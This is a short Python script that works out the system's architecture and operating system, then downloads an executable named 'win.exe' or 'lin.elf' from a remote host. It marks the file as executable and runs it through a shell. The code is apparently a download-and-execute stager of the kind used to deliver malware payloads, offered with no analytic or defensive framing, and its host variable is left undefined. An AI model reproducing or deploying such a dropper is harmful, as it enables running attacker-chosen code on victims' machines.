from sys import platform, maxsize
from urllib.request import urlretrieve
from subprocess import call as _call
from functools import partial

call = partial(_call, shell=True) # redefine call

def get_arch():
    """An integer giving the maximum value a variable of type Py_ssize_t can take. 
    It’s usually 2**31 - 1 on a 32-bit platform and 2**63 - 1 on a 64-bit platform."""
    return 'x64' if maxsize == 2**63 - 1 else 'x86'

def init(arch, file_name): 
    """Download file and call shell"""
    url_file = 'http://%s/%s/%s' % (host, arch, file_name)
    urlretrieve(url_file, file_name)
    
    if platform.startswith('win'):
        call('call ' + file_name)
    else:
        call('chmod +x ' + file_name)
        call('./' + file_name)

def main(): 
    arch = get_arch()
    if platform.startswith('win'):
        file_name = 'win.exe'
    else:
        file_name = 'lin.elf'
    init(arch, file_name)

if __name__ == "__main__":
    main()
